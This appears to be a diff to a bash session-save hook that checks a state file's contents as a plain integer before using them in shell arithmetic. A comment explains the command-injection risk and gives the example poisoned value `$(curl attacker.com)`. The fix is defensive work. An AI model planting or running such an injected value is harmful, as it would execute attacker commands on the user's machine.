@@ -111,7 +111,15 @@ fi
 LAST_SAVE_FILE="$STATE_DIR/${SESSION_ID}_last_save"
 LAST_SAVE=0
 if [ -f "$LAST_SAVE_FILE" ]; then
-    LAST_SAVE=$(cat "$LAST_SAVE_FILE")
+    LAST_SAVE_RAW=$(cat "$LAST_SAVE_FILE")
+    # SECURITY: bash arithmetic ($((...))) executes $(...) command substitution,
+    # so a poisoned state file containing e.g. `$(curl attacker.com)` would
+    # run that command on the next hook invocation. Validate as a plain integer
+    # before letting the value reach $((EXCHANGE_COUNT - LAST_SAVE)) below.
+    # Ported from upstream 0f217f7 (refs MemPalace/mempalace#809).
+    if [[ "$LAST_SAVE_RAW" =~ ^[0-9]+$ ]]; then
+        LAST_SAVE="$LAST_SAVE_RAW"
+    fi
 fi
 
 SINCE_LAST=$((EXCHANGE_COUNT - LAST_SAVE))
